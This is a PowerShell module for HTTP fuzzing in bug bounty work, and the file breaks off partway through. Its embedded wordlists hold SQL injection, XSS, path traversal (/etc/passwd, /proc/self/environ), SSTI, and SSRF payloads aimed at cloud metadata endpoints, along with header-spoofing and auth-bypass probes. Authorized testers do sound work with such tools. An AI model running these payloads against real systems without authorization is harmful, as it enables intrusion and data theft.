<#
.SYNOPSIS
    Fuzzer Toolkit — HTTP fuzzing toolkit for bug bounty hunting on Windows.
.DESCRIPTION
    A comprehensive PowerShell module providing 19 functions for web application
    fuzzing: parameter, path, header, method, content-type, JSON field fuzzing,
    plus IDOR, SSRF, SQLi, XSS, SSTI, LFI, rate-limit, no-auth, CORS probes,
    and a full pipeline orchestrator.

    All HTTP requests use curl.exe (bundled with Windows 10/11 + Server 2019+).
.NOTES
    Author:   Fuzzer Toolkit
    Version:  1.0.0
    Requires: Windows 10+ / Server 2019+, curl.exe, PowerShell 5.1+
    Warning:  Only use against targets you are authorized to test.
              This tool can generate high volumes of traffic. Respect
              rate limits and scope boundaries. The author assumes no
              liability for misuse.
.LINK
    https://curl.se/docs/manpage.html
#>

#requires -Version 5.1

# ──────────────────────────────────────────────────────────────────────────────
# INTERNAL HELPERS
# ──────────────────────────────────────────────────────────────────────────────

function _Resolve-Url {
    param([string]$BaseUrl, [string]$Path)
    $BaseUrl = $BaseUrl.TrimEnd('/')
    $Path = $Path.TrimStart('/')
    return "$BaseUrl/$Path"
}

function _Get-Timestamp {
    return Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
}

function _Invoke-Curl {
    param(
        [Parameter(Mandatory)] [string]$Url,
        [string]$Method = 'GET',
        [string]$Body = '',
        [string]$ContentType = '',
        [string]$Headers = '',
        [int]$DelayMs = 0,
        [int]$TimeoutSec = 15,
        [string]$OutputFile = ''
    )

    if ($DelayMs -gt 0) { Start-Sleep -Milliseconds $DelayMs }

    $argsList = @('-s', '-S', '-i', '--max-time', $TimeoutSec.ToString(), '-L')

    if ($Method -ne 'GET') { $argsList += '-X'; $argsList += $Method }
    if ($Body -and ($Method -in 'POST','PUT','PATCH')) {
        $argsList += '-d'; $argsList += $Body
    }
    if ($ContentType) { $argsList += '-H'; $argsList += "Content-Type: $ContentType" }
    if ($Headers) {
        foreach ($h in ($Headers -split "`n")) {
            $h = $h.Trim()
            if ($h) { $argsList += '-H'; $argsList += $h }
        }
    }
    if ($OutputFile) { $argsList += '-o'; $argsList += $OutputFile }

    $argsList += $Url

    try {
        $result = curl.exe @argsList 2>&1
        $exitCode = $LASTEXITCODE
    } catch {
        Write-Warning "[_Invoke-Curl] curl.exe failed: $_"
        return @{ StatusCode = $null; Body = ""; Headers = ""; ExitCode = -1; Error = $_.ToString() }
    }

    $statusCode = 0
    $responseHeaders = ''
    $responseBody = ''
    $responseLines = @()

    if ($result -is [array]) {
        $responseLines = $result
    } elseif ($result) {
        $responseLines = @($result.ToString())
    }

    if ($responseLines.Count -gt 0 -and $exitCode -eq 0) {
        $inHeaders = $true
        for ($i = 0; $i -lt $responseLines.Count; $i++) {
            $line = $responseLines[$i]
            if ($inHeaders) {
                if ($line -match '^HTTP/\d\.\d\s+(\d+)') {
                    $statusCode = [int]$Matches[1]
                }
                if ($line.Trim() -eq '' -and $statusCode -gt 0) {
                    $inHeaders = $false
                    continue
                }
                if ($inHeaders) {
                    if ($responseHeaders) { $responseHeaders += "`n" }
                    $responseHeaders += $line
                }
            } else {
                if ($responseBody) { $responseBody += "`n" }
                $responseBody += $line
            }
        }
    } elseif ($responseLines.Count -gt 0) {
        $responseBody = $responseLines -join "`n"
    }

    return @{
        Url        = $Url
        Method     = $Method
        StatusCode = $statusCode
        BodySize   = $responseBody.Length
        Body       = $responseBody
        Headers    = $responseHeaders
        ExitCode   = $exitCode
        Raw        = $responseLines
    }
}

function _Get-SizeAnomaly {
    param([int[]]$Sizes, [int]$CurrentSize)
    if ($Sizes.Count -lt 3) { return $false }
    $avg = ($Sizes | Measure-Object -Average).Average
    $sum = 0
    foreach ($s in $Sizes) { $sum += ($s - $avg) * ($s - $avg) }
    $std = [Math]::Max([Math]::Sqrt($sum / $Sizes.Count), 1)
    return [Math]::Abs($CurrentSize - $avg) -gt ($std * 2.5)
}

function _Write-Anomaly {
    param([string]$Message)
    Write-Host "[!] ANOMALY: $Message" -ForegroundColor Red
}

function _Write-Info {
    param([string]$Message)
    Write-Host "[*] $Message" -ForegroundColor Cyan
}

function _Write-Success {
    param([string]$Message)
    Write-Host "[+] $Message" -ForegroundColor Green
}

function _Write-Warn {
    param([string]$Message)
    Write-Host "[-] $Message" -ForegroundColor Yellow
}

function _Write-Status {
    param([string]$Message)
    Write-Host "[~] $Message" -ForegroundColor Gray
}

# ──────────────────────────────────────────────────────────────────────────────
# EMBEDDED WORDLISTS
# ──────────────────────────────────────────────────────────────────────────────

$script:EmbeddedWordlists = @{
    params = @(
        'id','uid','user_id','userid','account_id','accountid','profile_id',
        'profileid','customer_id','customerid','order_id','orderid','invoice_id',
        'invoiceid','document_id','documentid','file_id','fileid','attachment_id',
        'token','api_token','access_token','auth_token','session_id','sid',
        'page','page_number','offset','limit','count','skip','start','end',
        'sort','order','dir','direction','filter','search','q','query','term',
        'keyword','name','title','slug','url','redirect','next','prev','return',
        'return_url','redirect_url','callback','callback_url','webhook','hook',
        'target','destination','path','file','filename','template','view',
        'include','import','load','read','data','content','html','markdown',
        'format','type','response_type','accept','debug','trace','test',
        'admin','role','permission','group','status','state','action','method',
        'command','function','func','cmd','exec','run','email','phone',
        'username','login','password','passwd','secret','key','api_key',
        'apikey','signature','hash','checksum','nonce','timestamp','date',
        'lang','locale','timezone','currency','amount','price','total',
        'is_admin','is_active','is_verified','verified','active','enabled'
    )
    paths = @(
        'admin','api','v1','v2','v3','graphql','swagger','api-docs','docs',
        '.env','.git/config','.git/HEAD','config','backup','wp-admin',
        'administrator','login','signin','signup','register','account',
        'profile','user','users','customer','customers','order','orders',
        'invoice','invoices','payment','payments','checkout','cart',
        'search','upload','download','export','import','assets','static',
        'uploads','images','img','css','js','fonts','files','robots.txt',
        'sitemap.xml','favicon.ico','crossdomain.xml','web.config',
        '.htaccess','server-status','server-info','phpinfo.php','info',
        'debug','test','health','healthcheck','status','metrics','prometheus',
        'api/health','api/status','api/v1/users','api/v1/admin',
        'api/v1/config','api/v1/settings','api/v1/debug',
        '.well-known/security.txt','.well-known/openid-configuration'
    )
    headers = @(
        'X-Forwarded-For: 127.0.0.1',
        'X-Forwarded-Host: localhost',
        'X-Real-Ip: 127.0.0.1',
        'X-Originating-Ip: 127.0.0.1',
        'X-Remote-Ip: 127.0.0.1',
        'X-Client-Ip: 127.0.0.1',
        'X-Forwarded-Proto: https',
        'X-Forwarded-Scheme: https',
        'X-Original-Url: /admin',
        'X-Rewrite-Url: /admin',
        'X-HTTP-Method-Override: PUT',
        'X-HTTP-Method: PUT',
        'X-Method-Override: PUT',
        'Content-Type: application/x-www-form-urlencoded',
        'Content-Type: application/json',
        'Content-Type: application/xml',
        'Content-Type: multipart/form-data',
        'Accept: application/json',
        'Accept: text/html,application/xhtml+xml',
        'Accept: */*',
        'Cookie: admin=true',
        'Cookie: is_admin=1',
        'Cookie: role=admin',
        'Cookie: debug=true',
        'Cookie: session=.',
        'Origin: https://evil.com',
        'Referer: https://evil.com',
        'X-Forwarded-For: 127.0.0.2',
        'X-Forwarded-For: 10.0.0.1'
    )
    methods = @('GET','POST','PUT','PATCH','DELETE','HEAD','OPTIONS','TRACE','CONNECT')
    content_types = @(
        'application/x-www-form-urlencoded',
        'application/json',
        'application/json; charset=utf-8',
        'application/json; version=2',
        'application/vnd.api+json',
        'application/xml',
        'application/xml; charset=utf-8',
        'text/xml',
        'text/plain',
        'text/html',
        'multipart/form-data; boundary=BOUNDARY',
        'application/x-www-form-urlencoded; charset=utf-8',
        'application/graphql',
        'application/octet-stream',
        'application/pdf',
        'image/png',
        'image/jpeg'
    )
    sqli = @(
        "'",
        "''",
        "`"",
        '\',
        "' OR '1'='1",
        "' OR '1'='1' --",
        "admin' --",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "1' ORDER BY 1--",
        "1' ORDER BY 10--",
        "' AND 1=1--",
        "' AND 1=2--",
        "' AND SLEEP(5)--",
        "'; WAITFOR DELAY '0:0:5'--",
        "1/**/OR/**/1=1",
        "' OR '1'='1' /*",
        "admin'/*",
        "' UNION ALL SELECT 1,2,3--",
        "' UNION SELECT @@version--",
        "' UNION SELECT database()--",
        "' UNION SELECT user()--",
        "') OR ('1'='1",
        '1 OR 1=1',
        "' OR 1=1--",
        '1; SELECT 1',
        "' AND 1=(SELECT COUNT(*) FROM users)--"
    )
    xss = @(
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<body onload=alert(1)>',
        '"><script>alert(1)</script>',
        '"><img src=x onerror=alert(1)>',
        "'-alert(1)-'",
        '`-alert(1)-`',
        '${alert(1)}',
        '[[$[alert(1)]]]',
        'javascript:alert(1)',
        '" onfocus="alert(1)" autofocus="',
        '<details open ontoggle=alert(1)>',
        '<marquee onstart=alert(1)>',
        '<input autofocus onfocus=alert(1)>',
        '<select autofocus onfocus=alert(1)>',
        '<textarea autofocus onfocus=alert(1)>',
        '"><svg onload=alert(1)>',
        "'><img src=x onerror=alert(1)>"
    )
    lfi = @(
        '../../../etc/passwd',
        '../../../../etc/passwd',
        '../../../../../etc/passwd',
        '../../../../../../etc/passwd',
        '../etc/passwd',
        '....//....//....//etc/passwd',
        '..\..\..\windows\win.ini',
        '..\..\..\..\windows\win.ini',
        '..\..\..\..\..\windows\win.ini',
        '..\..\..\..\..\..\windows\win.ini',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd',
        '..%252f..%252f..%252fetc/passwd',
        '....//....//....//....//etc/passwd',
        '..%c0%ae..%c0%ae..%c0%aeetc/passwd',
        '../../../etc/passwd%00',
        '../../../etc/passwd%00.png',
        '../../../etc/passwd#',
        '../../../../../../../../etc/passwd',
        '../../../var/log/apache2/access.log',
        '../../../var/log/nginx/access.log',
        '../../../proc/self/environ',
        '../../../proc/self/fd/0',
        '../../../proc/self/fd/1',
        '../../../proc/self/fd/2'
    )
    ssti = @(
        '{{7*7}}',
        '{{7*''7''}}',
        '${7*7}',
        '#{7*7}',
        '*{7*7}',
        '{{config}}',
        '{{self}}',
        '{{request}}',
        '<%= 7*7 %>',
        '${{7*7}}',
        '@(7*7)',
        '{7*7}',
        '{{''.__class__.__mro__}}',
        '{{''.__class__.__mro__[2].__subclasses__()}}',
        '{{''.__class__.__bases__[0].__subclasses__()}}',
        '{{7*7}}test'
    )
    ssrf = @(
        'http://127.0.0.1:80',
        'http://127.0.0.1:443',
        'http://127.0.0.1:8080',
        'http://127.0.0.1:22',
        'http://127.0.0.1:3306',
        'http://127.0.0.1:6379',
        'http://127.0.0.1:9200',
        'http://localhost:80',
        'http://localhost:443',
        'http://localhost:8080',
        'http://[::1]:80',
        'http://0.0.0.0:80',
        'http://0:80',
        'http://169.254.169.254/latest/meta-data/',
        'http://169.254.169.254/latest/user-data/',
        'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
        'http://metadata.google.internal/computeMetadata/v1/',
        'http://100.100.100.200/latest/meta-data/',
        'http://10.0.0.1:80',
        'http://10.0.0.1:443',
        'http://192.168.1.1:80',
        'http://172.16.0.1:80',
        'file:///etc/passwd',
        'file:///c:/windows/win.ini',
        'gopher://127.0.0.1:6379/_INFO',
        'dict://127.0.0.1:6379/INFO',
        'http://COLLABORATOR/test',
        'http://COLLABORATOR/ssrf'
    )
}

$script:NoAuthHeaders = @(
    @{},
    @{'Authorization' = 'Bearer '},
    @{'Authorization' = 'Bearer invalidtoken123'},
    @{'Authorization' = 'Basic '},
    @{'Authorization' = 'Basic YWRtaW46YWRtaW4='},
    @{'Cookie' = 'session=.'},
    @{'Cookie' = 'session='},
    @{'Cookie' = 'auth='},
    @{'X-Forwarded-For' = '127.0.0.1'},
    @{'Authorization' = 'Bearer 0'},
    @{'Authorization' = 'Bearer null'}
)

# ──────────────────────────────────────────────────────────────────────────────
# FUNCTION: Get-Wordlist
# ──────────────────────────────────────────────────────────────────────────────

<#
.SYNOPSIS
    Return a wordlist for a given fuzz category.
.DESCRIPTION
    Loads an embedded wordlist or reads from an external file path.
    Supports categories: params, paths, headers, methods, content_types,
    sqli, xss, lfi, ssti, ssrf.
.PARAMETER Category
    The wordlist category name.
.PARAMETER FilePath
    Optional path to an external file (one entry per line).
.PARAMETER MinLength
    Filter out entries shorter than this value.
.PARAMETER MaxLength
    Filter out entries longer than this value.
.EXAMPLE
    $words = Get-Wordlist -Category params
    $words = Get-Wordlist -FilePath .\custom.txt
#>
function Get-Wordlist {
    [CmdletBinding()]
    param(
        [Parameter(ParameterSetName='Category')]
        [ValidateSet('params','paths','headers','methods','content_types','sqli','xss','lfi','ssti','ssrf')]
        [string]$Category = 'params',
        [Parameter(ParameterSetName='File')]
        [ValidateScript({Test-Path -LiteralPath $_ -PathType Leaf})]
        [string]$FilePath,
        [ValidateRange(0,10000)]
        [int]$MinLength = 0,
        [ValidateRange(0,100000)]
        [int]$MaxLength = 10000
    )

    if ($FilePath) {
        _Write-Info "Loading wordlist from $FilePath"
        $list = Get-Content -LiteralPath $FilePath -ReadCount 0
    } else {
        _Write-Info "Loading embedded wordlist for category: $Category"
        $list = $script:EmbeddedWordlists[$Category]
    }

    if (-not $list) { $list = @() }
    $filtered = $list | Where-Object {
        $_.Length -ge $MinLength -and $_.Length -le $MaxLength
    }
    return @($filtered)
}

# ──────────────────────────────────────────────────────────────────────────────
# FUNCTION: Invoke-ParameterFuzz
# ──────────────────────────────────────────────────────────────────────────────

<#
.SYNOPSIS
    Fuzz URL query parameters with a wordlist.
.DESCRIPTION
    Appends each word as a query parameter with an empty value (or payload)
    and compares response status code and body size to detect anomalies.
    Useful for finding undocumented parameters, mass assignment candidates,
    and debug endpoints.
.PARAMETER Url
    Base URL to fuzz (without query string).
.PARAMETER Payload
    Optional value to assign to each parameter (default: '').
.PARAMETER Wordlist
    Array of parameter names to test. Defaults to embedded params list.
.PARAMETER Method
    HTTP method to use (default: GET).
.PARAMETER DelayMs
    Milliseconds to wait between requests (default: 100).
.PARAMETER TimeoutSec
    Per-request timeout in seconds (default: 15).
.PARAMETER BaselineResponseSize
    Pre-known baseline body size for anomaly detection.
.EXAMPLE
    Invoke-ParameterFuzz -Url 'https://target.com/api/users' -DelayMs 200
#>
function Invoke-ParameterFuzz {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory,Position=0)]
        [ValidateScript({$_ -match '^https?://'})]
        [string]$Url,
        [string]$Payload = '',
        [string[]]$Wordlist = (Get-Wordlist -Category params),
        [ValidateSet('GET','POST','PUT','PATCH','DELETE')]
        [string]$Method = 'GET',
        [ValidateRange(0,5000)]
        [int]$DelayMs = 100,
        [ValidateRange(1,120)]
        [int]$TimeoutSec = 15,
        [int]$BaselineResponseSize = 0
    )

    _Write-Info "Parameter Fuzzing - $Url ($Method, Delay=${DelayMs}ms)"
    $results = @()
    $baselineUrl = "$($Url.TrimEnd('?'))?__baseline=$([guid]::NewGuid().Guid)"
    $baseline = _Invoke-Curl -Url $baselineUrl -Method $Method -DelayMs 0 -TimeoutSec $TimeoutSec
    if ($BaselineResponseSize -eq 0) { $BaselineResponseSize = $baseline.BodySize }
    $responseSizes = @($BaselineResponseSize)

    foreach ($param in $Wordlist) {
        $queryString = "$param=$([System.Uri]::EscapeDataString($Payload))"
        $fuzzUrl = "$($Url.TrimEnd('?'))?$queryString"
        $resp = _Invoke-Curl -Url $fuzzUrl -Method $Method -DelayMs $DelayMs -TimeoutSec $TimeoutSec

        $isAnomaly = $false
        if ($resp.StatusCode -ne $baseline.StatusCode) { $isAnomaly = $true }
        if ($resp.BodySize -ne $BaselineResponseSize -and -not $isAnomaly) {
            $isAnomaly = _Get-SizeAnomaly -Sizes $responseSizes -CurrentSize $resp.BodySize
        }

        if ($isAnomaly) {
            _Write-Anomaly "$param -> Status=$($resp.StatusCode) Size=$($resp.BodySize) (baseline=$BaselineResponseSize)"
        }
        $responseSizes += $resp.BodySize
        if ($responseSizes.Count -gt 20) { $responseSizes = $responseSizes[-20..-1] }

        $results += [PSCustomObject]@{
            Parameter  = $param
            Url        = $fuzzUrl
            StatusCode = $resp.StatusCode
            BodySize   = $resp.BodySize
            IsAnomaly  = $isAnomaly
            Baseline   = $BaselineResponseSize
        }
    }

    _Write-Success "Parameter fuzzing complete - $($results.Count) parameters tested"
    return $results
}

# ──────────────────────────────────────────────────────────────────────────────
# FUNCTION: Invoke-PathFuzz
# ──────────────────────────────────────────────────────────────────────────────

<#
.SYNOPSIS
    Fuzz URL paths for directory/file brute-forcing.
.DESCRIPTION
    Appends each word from the wordlist to the base URL and records
    the response status code. Highlights 200, 403, 500 responses
    (non-404) as potential findings. Useful for discovering hidden
    endpoints, admin panels, API routes, and configuration files.
.PARAMETER BaseUrl
    Base URL (e.g., https://target.com).
.PARAMETER Wordlist
    Array of paths to test.
.PARAMETER Method
    HTTP method (default: GET).
.PARAMETER Extensions
    Array of extensions to append (e.g., .php, .asp, .json).
.PARAMETER DelayMs
    Delay between requests in milliseconds (default: 100).
.PARAMETER TimeoutSec
    Per-request timeout (default: 15).
.EXAMPLE
    Invoke-PathFuzz -BaseUrl 'https://target.com' -Extensions @('.php','.asp')
#>
function Invoke-PathFuzz {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory,Position=0)]
        [ValidateScript({$_ -match '^https?://'})]
        [string]$BaseUrl,
        [string[]]$Wordlist = (Get-Wordlist -Category paths),
        [ValidateSet('GET','POST','PUT','PATCH','DELETE','HEAD')]
        [string]$Method = 'GET',
        [string[]]$Extensions = @(),
        [ValidateRange(0,5000)]
        [int]$DelayMs = 100,
        [ValidateRange(1,120)]
        [int]$TimeoutSec = 15
    )

    _Write-Info "Path Fuzzing - $BaseUrl ($Method, Delay=${DelayMs}ms)"
    $results = @()
    $found = @()

    foreach ($path in $Wordlist) {
        $pathsToTest = @($path)
        foreach ($ext in $Extensions) {
            $pathsToTest += "$path$ext"
        }
        $pathsToTest = $pathsToTest | Select-Object -Unique

        foreach ($testPath in $pathsToTest) {
            $url = _Resolve-Url -BaseUrl $BaseUrl -Path $testPath
            $resp = _Invoke-Curl -Url $url -Method $Method -DelayMs $DelayMs -TimeoutSec $TimeoutSec

            $interesting = $false
            $interestReason = ''
            if ($resp.StatusCode -in 200,201,202,204) {
                $interesting = $true; $interestReason = 'OK response'
            } elseif ($resp.StatusCode -eq 301 -or $resp.StatusCode -eq 302) {
                $interesting = $true; $interestReason = 'Redirect'
            } elseif ($resp.StatusCode -eq 403) {
                $interesting = $true; $interestReason = 'Forbidden (exists)'
            } elseif ($resp.StatusCode -eq 401) {
                $interesting = $true; $interestReason = 'Unauthorized (exists)'
            } elseif ($resp.StatusCode -eq 500) {
                $interesting = $true; $interestReason = 'Server error'
            } elseif ($resp.StatusCode -eq 405) {
                $interesting = $true; $interestReason = 'Method not allowed'
            } elseif ($resp.StatusCode -eq 0 -and $resp.ExitCode -ne 0) {
                $interesting = $true; $interestReason = 'Connection error'
            }

            if ($interesting) {
                _Write-Anomaly "$testPath -> $($resp.StatusCode) ($interestReason) Size=$($resp.BodySize)"
                $found += "$testPath ($($resp.StatusCode))"
            }
            $results += [PSCustomObject]@{
                Path        = $testPath
                Url         = $url
                StatusCode  = $resp.StatusCode
                BodySize    = $resp.BodySize
                Interesting = $interesting
                Reason      = $interestReason
            }
        }
    }

    _Write-Success "Path fuzzing complete - $($results.Count) paths tested, $($found.Count) interesting"
    return $results
}

# ──────────────────────────────────────────────────────────────────────────────
# FUNCTION: Invoke-HeaderFuzz
# ──────────────────────────────────────────────────────────────────────────────

<#
.SYNOPSIS
    Fuzz HTTP headers for header injection and cache poisoning.
.DESCRIPTION
    Sends requests with modified/custom headers to detect header
    injection, cache poisoning via X-Forwarded-*, and authentication
    bypass via special headers.
.PARAMETER Url
    Target URL.
.PARAMETER Wordlist
    Array of header strings in Name: Value format.
.PARAMETER Method
    HTTP method (default: GET).
.PARAMETER BaselineHeaders
    Hashtable of default headers to include with each request.
.PARAMETER DelayMs
    Delay between requests (default: 100).
.PARAMETER TimeoutSec
    Per-request timeout (default: 15).
.EXAMPLE
    Invoke-HeaderFuzz -Url 'https://target.com/admin'
#>
function Invoke-HeaderFuzz {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory,Position=0)]
        [ValidateScript({$_ -match '^https?://'})]
        [string]$Url,
        [string[]]$Wordlist = (Get-Wordlist -Category headers),
        [ValidateSet('GET','POST','PUT','PATCH','DELETE','HEAD','OPTIONS')]
        [string]$Method = 'GET',
        [hashtable]$BaselineHeaders = @{},
        [ValidateRange(0,5000)]
        [int]$DelayMs = 100,
        [ValidateRange(1,120)]
        [int]$TimeoutSec = 15
    )

    _Write-Info "Header Fuzzing - $Url ($Method, Delay=${DelayMs}ms)"

    $baselineResp = _Invoke-Curl -Url $Url -Method $Method -DelayMs 0 -TimeoutSec $TimeoutSec
    $results = @()

    $baseHeadersStr = ''
    if ($BaselineHeaders.Count -gt 0) {
        $pairs = @()
        foreach ($entry in $BaselineHeaders.GetEnumerator()) {
            $pairs += "$($entry.Key): $($entry.Value)"
        }
        $baseHeadersStr = $pairs -join "`n"
    }

    foreach ($header in $Wordlist) {
        $fullHeaders = $baseHeadersStr
        if ($fullHeaders) { $fullHeaders += "`n" }
        $fullHeaders += $header

        $resp = _Invoke-Curl -Url $Url -Method $Method -Headers $fullHeaders -DelayMs $DelayMs -TimeoutSec $TimeoutSec

        $isAnomaly = $false
        $anomalyReasons = @()

        if ($resp.StatusCode -ne $baselineResp.StatusCode) {
            $isAnomaly = $true
            $anomalyReasons += "Status changed ($($baselineResp.StatusCode)->$($resp.StatusCode))"
        }
        if ($resp.BodySize -ne $baselineResp.BodySize -and $resp.BodySize -gt 0) {
            $isAnomaly = $true
            $anomalyReasons += "Body size changed ($($baselineResp.BodySize)->$($resp.BodySize))"
        }

        $headerName = ($header -split ':')[0].Trim()
        $reflectedInBody = $resp.Body -match [regex]::Escape($headerName)
        $reflectedInHeaders = $resp.Headers -match [regex]::Escape($headerName)

        if ($reflectedInBody) {
            $isAnomaly = $true
            $anomalyReasons += 'Header reflected in body'
        }
        if ($reflectedInHeaders) {
            $isAnomaly = $true
            $anomalyReasons += 'Header reflected in response headers'
        }

        if ($isAnomaly) {
            _Write-Anomaly "$header -> $($anomalyReasons -join '; ')"
        }

        $results += [PSCustomObject]@{
            Header         = $header
            StatusCode     = $resp.StatusCode
            BodySize       = $resp.BodySize
            IsAnomaly      = $isAnomaly
            AnomalyReason  = $anomalyReasons -join '; '
            BaselineStatus = $baselineResp.StatusCode
            BaselineSize   = $baselineResp.BodySize
        }
    }

    _Write-Success "Header fuzzing complete - $($results.Count) headers tested"
    return $results
}

# ──────────────────────────────────────────────────────────────────────────────
# FUNCTION: Invoke-MethodBrute
# ──────────────────────────────────────────────────────────────────────────────

<#
.SYNOPSIS
    Test all HTTP methods on a single endpoint.
.DESCRIPTION
    Sends requests using GET, POST, PUT, PATCH, DELETE, HEAD, OPTIONS,
    TRACE, and CONNECT methods to detect method override acceptance
    and unexpected method support.
.PARAMETER Url
    Target URL.
.PARAMETER AdditionalMethods
    Extra methods to test.
.PARAMETER Body
    Request body to send with methods that support it (POST, PUT, PATCH).
.PARAMETER ContentType
    Content-Type header value for body-based methods.
.PARAMETER DelayMs
    Delay between requests (default: 100).
.PARAMETER TimeoutSec
    Per-request timeout (default: 15).
.PARAMETER TestOverride
    Also test X-HTTP-Method-Override header on a POST request.
.EXAMPLE
    Invoke-MethodBrute -Url 'https://target.com/api/resource/1'
#>
function Invoke-MethodBrute {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory,Position=0)]
        [ValidateScript({$_ -match '^https?://'})]
        [string]$Url,
        [string[]]$AdditionalMethods = @(),
        [string]$Body = '',
        [string]$ContentType = 'application/json',
        [ValidateRange(0,5000)]
        [int]$DelayMs = 100,
        [ValidateRange(1,120)]
        [int]$TimeoutSec = 15,
        [switch]$TestOverride
    )

    _Write-Info "Method Brute - $Url (Delay=${DelayMs}ms)"
    $allMethods = (Get-Wordlist -Category methods) + $AdditionalMethods | Select-Object -Unique
    $results = @()

    foreach ($method in $allMethods) {
        $useBody = $method -in 'POST','PUT','PATCH'
        if ($useBody) {
            $resp = _Invoke-Curl -Url $Url -Method $method -Body $Body -ContentType $ContentType -DelayMs $DelayMs -TimeoutSec $TimeoutSec
        } else {
            $resp = _Invoke-Curl -Url $Url -Method $method -DelayMs $DelayMs -TimeoutSec $TimeoutSec
        }

        $note = ''
        if ($resp.StatusCode -in 200,201,202,204) { $note = 'Method accepted' }
        elseif ($resp.StatusCode -eq 405) { $note = 'Method not allowed' }
        elseif ($resp.StatusCode -eq 403) { $note = 'Forbidden' }
        elseif ($resp.StatusCode -eq 401) { $note = 'Unauthorized' }
        elseif ($resp.StatusCode -eq 501) { $note = 'Not implemented' }

        $noteText = if ($note) { $note } else { "Status $($resp.StatusCode)" }
        if ($note -and $note -ne 'Method not allowed') {
            _Write-Anomaly "$method -> $($resp.StatusCode) ($note)"
        } else {
            _Write-Status "$method -> $($resp.StatusCode) ($noteText)"
        }

        $results += [PSCustomObject]@{
            Method     = $method
            StatusCode = $resp.StatusCode
            BodySize   = $resp.BodySize
            Note       = $note
        }
    }

    if ($TestOverride) {
        _Write-Info "Testing method override via X-HTTP-Method-Override header"
        $overrideMethods = @('PUT','PATCH','DELETE','HEAD')
        foreach ($om in $overrideMethods) {
            $overrideHeader = "X-HTTP-Method-Override: $om"
            $resp = _Invoke-Curl -Url $Url -Method 'POST' -Body $Body -ContentType $ContentType -Headers $overrideHeader -DelayMs $DelayMs -TimeoutSec $TimeoutSec
            if ($resp.StatusCode -in 200,201,202,204) {
                _Write-Anomaly "POST with X-HTTP-Method-Override: $om -> $($resp.StatusCode) (OVERRIDE ACCEPTED)"
            }
            $overrideNote = if ($resp.StatusCode -in 200,201,202,204) { 'Override accepted' } else { 'Override rejected' }
            $results += [PSCustomObject]@{
                Method     = "POST (Override: $om)"
                StatusCode = $resp.StatusCode
                BodySize   = $resp.BodySize
                Note       = $overrideNote
            }
        }
    }

    _Write-Success "Method brute complete - $($results.Count) methods tested"
    return $results
}

# ──────────────────────────────────────────────────────────────────────────────
# FUNCTION: Invoke-ContentTypeFuzz
# ──────────────────────────────────────────────────────────────────────────────

<#
.SYNOPSIS
    Test different Content-Type values on API endpoints.
.DESCRIPTION
    Sends POST/PUT requests with various Content-Type headers and
    observes changes in response status, body, or error messages.
    Useful for detecting parser confusion, deserialization bugs,
    and content-negotiation bypasses.
.PARAMETER Url
    Target URL.
.PARAMETER Body
    Request body to send with each Content-Type.
.PARAMETER Method
    HTTP method (default: POST).
.PARAMETER Wordlist
    Array of Content-Type values to test.
.PARAMETER DelayMs
    Delay between requests (default: 100).
.PARAMETER TimeoutSec
    Per-request timeout (default: 15).
.EXAMPLE
    Invoke-ContentTypeFuzz -Url 'https://target.com/api/upload' -Body '{"test":"data"}'
#>
function Invoke-ContentTypeFuzz {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory,Position=0)]
        [ValidateScript({$_ -match '^https?://'})]
        [string]$Url,
        [string]$Body = '{}',
        [ValidateSet('POST','PUT','PATCH')]
        [string]$Method = 'POST',
        [string[]]$Wordlist = (Get-Wordlist -Category content_types),
        [ValidateRange(0,5000)]
        [int]$DelayMs = 100,
        [ValidateRange(1,120)]
        [int]$TimeoutSec = 15
    )

    _Write-Info "Content-Type Fuzzing - $Url ($Method, Delay=${DelayMs}ms)"
    $results = @()
    $baselineResp = _Invoke-Curl -Url $Url -Method $Method -Body $Body -ContentType 'application/json' -DelayMs 0 -TimeoutSec $TimeoutSec

    foreach ($ct in $Wordlist) {
        $resp = _Invoke-Curl -Url $Url -Method $Method -Body $Body -ContentType $ct -DelayMs $DelayMs -TimeoutSec $TimeoutSec

        $isAnomaly = $false
        if ($resp.StatusCode -ne $baselineResp.StatusCode) { $isAnomaly = $true }
        if ($resp.BodySize -ne $baselineResp.BodySize -and $resp.BodySize -gt 0) { $isAnomaly = $true }
        $errorInBody = $resp.Body -match '(error|exception|stack trace|traceback|syntax error|unexpected|invalid)'
        if ($errorInBody) { $isAnomaly = $true }

        if ($isAnomaly) {
            $msg = "$ct -> $($resp.StatusCode) Size=$($resp.BodySize)"
            if ($errorInBody) { $msg += ' [Error in response]' }
            _Write-Anomaly $msg
        }

        $results += [PSCustomObject]@{
            ContentType    = $ct
            StatusCode     = $resp.StatusCode
            BodySize       = $resp.BodySize
            IsAnomaly      = $isAnomaly
            HasError       = $errorInBody
            BaselineStatus = $baselineResp.StatusCode
            BaselineSize   = $baselineResp.BodySize
        }
    }

    _Write-Success "Content-Type fuzzing complete - $($results.Count) types tested"
    return $results
}

# ──────────────────────────────────────────────────────────────────────────────
# FUNCTION: Invoke-JsonFieldFuzz
# ──────────────────────────────────────────────────────────────────────────────

<#
.SYNOPSIS
    Fuzz individual JSON body fields with different data types.
.DESCRIPTION
    Takes a JSON template and iteratively replaces each field value
    with different types (string, integer, array, null, bool, object)
    to detect mass assignment, type confusion, and parser bugs.
.PARAMETER Url
    Target URL.
.PARAMETER JsonBody
    JSON object as a string to use as template.
.PARAMETER FieldList
    Specific fields to fuzz. If empty, all top-level fields are fuzzed.
.PARAMETER Method
    HTTP method (default: POST).
.PARAMETER DelayMs
    Delay between requests (default: 100).
.PARAMETER TimeoutSec
    Per-request timeout (default: 15).
.EXAMPLE
    Invoke-JsonFieldFuzz -Url 'https://target.com/api/users' -JsonBody '{"name":"test","role":"user"}'
#>
function Invoke-JsonFieldFuzz {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory,Position=0)]
        [ValidateScript({$_ -match '^https?://'})]
        [string]$Url,
        [Parameter(Mandatory)]
        [string]$JsonBody,
        [string[]]$FieldList = @(),
